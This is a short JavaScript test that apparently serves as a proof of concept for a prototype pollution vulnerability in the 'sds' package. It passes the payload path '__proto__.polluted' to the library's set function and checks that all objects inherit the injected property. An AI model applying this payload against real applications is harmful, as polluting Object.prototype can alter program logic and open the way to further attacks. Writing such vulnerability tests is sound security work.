test("prototype pollution in sds", () => {
  const root = require("sds");

  let payload = "__proto__.polluted";

  expect({}.polluted).toBe(undefined);

  root.set({}, payload, "yes");

  expect({}.polluted).toBe("yes");
});
